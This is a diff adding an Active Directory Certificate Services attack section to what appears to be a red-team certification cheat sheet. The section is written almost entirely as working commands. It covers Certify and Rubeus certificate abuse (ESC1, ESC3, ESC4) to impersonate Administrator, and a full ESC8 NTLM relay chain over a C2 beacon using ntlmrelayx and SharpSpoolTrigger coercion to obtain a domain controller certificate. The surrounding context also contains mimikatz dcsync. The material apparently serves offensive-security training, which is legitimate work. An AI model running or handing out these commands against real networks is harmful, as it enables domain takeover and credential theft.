@@ -885,6 +885,55 @@ mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959a
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:trusted_domain /dc:trusted_domain_dc  /rc4:inter_relam_key /nowrap
 ```
 
+## **ADCS Attacks**
+
+```powershell
+# Enumeration
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+
+# ESC1
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:MIACAQM.. /enctype:aes256 /nowrap
+
+# ESC3
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
+
+# ESC4 -> ESC1
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
+
+# ESC8
+## Unbind port 445 on a compromised machine
+### Set the lanmanserver service's start mode to disabled to prevent it from automatically restarting
+sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
+### Stop these services to unbind port 445
+sc_stop lanmanserver
+sc_stop srv2
+sc_stop srvnet
+## Start a reverse port forward on port 445 to tunnel incoming NTLM authentication requests down to our attacker machine
+rportfwd_local 445 localhost 7445
+## Run a SOCKS proxy for ntlmrelayx to forward the relayed requests back up to the ADCS HTTP endpoint
+socks 1080 socks5
+## Add an explicit Rule to allow inbound connection to Port 445 
+powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
+## run ntlmrelayx inside the Kali Docker container
+proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+## Use coerced authentication technique to force authentication from the DC machine to the compromised machine
+## The reverse port forward will tunnel the request down to ntlmrelayx, relay up through the SOCKS proxy. A file called LON-DC-1.pfx will be created.
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
+```
+Simple diagram summarizing the ESC8 NTLM relaying via C2:
+
+1. From the foothold machine force the DC machine to make an outbound SMB connection (NTLM auth) to the compromised host on port 445.
+2. The DC's NTLM auth packet hits port 445 on the compromised host. Beacon`rportfwd_local` immediately tunnels that packet down the C2 channel to your local machine at `localhost:7445`.
+3. Docker is listening on `localhost:7445`, which maps to port 445 inside the Kali container. ntlmrelayx receives the raw NTLM auth.
+4. ntlmrelayx relays the auth request outbound via `proxychains` through Beacon's SOCKS proxy on port 1080. That proxy routes the traffic back up through the C2 into the internal network, destination: ADCS HTTP endpoint on port 80.
+5. ADCS sees what looks like the DC authenticating to request a certificate. It issues a `DomainController` template certificate.
+6. The certificate comes back through the same SOCKS tunnel to ntlmrelayx, which saves it as `LON-DC-1.pfx`. 
+7. Finally you can use that cert to get a TGT for the DC machine account, and from there S4U2self to impersonate a domain admin.
+
+![image.png](/assets/crto/adcs.png)
+
 ## **OPSEC Notes**
 
 - **Cobalt Strike**
